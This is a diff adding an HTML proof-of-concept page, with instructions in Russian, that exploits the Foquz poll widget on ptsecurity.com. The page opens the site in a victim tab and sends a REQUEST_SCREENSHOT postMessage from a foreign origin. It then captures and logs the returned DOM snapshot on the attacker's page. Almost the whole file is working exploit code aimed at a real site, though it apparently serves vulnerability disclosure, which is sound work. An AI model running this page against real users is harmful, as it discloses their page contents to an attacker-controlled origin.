@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>PoC: Foquz REQUEST_SCREENSHOT cross-origin</title>
+</head>
+<body>
+<h3>PoC: Cross-Origin DOM Disclosure via Foquz Poll Widget</h3>
+<p>1. Нажмите кнопку ниже — откроется новая вкладка с ptsecurity.com.<br>
+2. Дождитесь появления виджета опроса (30–40 сек) на этой вкладке.<br>
+3. Вернитесь на эту страницу и нажмите «Запросить снапшот».<br>
+4. На вкладке жертвы появится оверлей — после клика «Готово» ответ придёт сюда, в контекст атакующего домена.</p>
+
+<button id="openTarget">1. Открыть ptsecurity.com</button>
+<button id="sendReq">2. Запросить снапшот</button>
+<pre id="log" style="white-space:pre-wrap;border:1px solid #ccc;padding:8px;max-height:400px;overflow:auto;"></pre>
+
+<script>
+let targetWin = null;
+const log = (msg) => {
+  document.getElementById('log').textContent += msg + "\n\n";
+};
+
+document.getElementById('openTarget').onclick = () => {
+  targetWin = window.open('https://ptsecurity.com/products/', 'victimTab');
+  log('[+] Окно жертвы открыто. Ждите появления виджета Foquz.');
+};
+
+document.getElementById('sendReq').onclick = () => {
+  if (!targetWin) { log('[-] Сначала откройте вкладку жертвы.'); return; }
+  // Атакующая страница инициирует запрос, находясь на СВОЁМ origin
+  targetWin.postMessage(JSON.stringify({type: "REQUEST_SCREENSHOT"}), "*");
+  log('[+] Запрос REQUEST_SCREENSHOT отправлен в контекст ptsecurity.com с постороннего origin (' + window.location.origin + ').');
+};
+
+// Слушаем ответ - он придёт от o.source.postMessage(..., o.origin),
+// то есть именно на этот, атакующий, window
+window.addEventListener('message', (e) => {
+  log('[+] Получен ответ от ' + e.origin + ':\n' + 
+      (typeof e.data === 'string' ? e.data.slice(0, 2000) + '...' : JSON.stringify(e.data)));
+});
+</script>
+</body>
+</html>
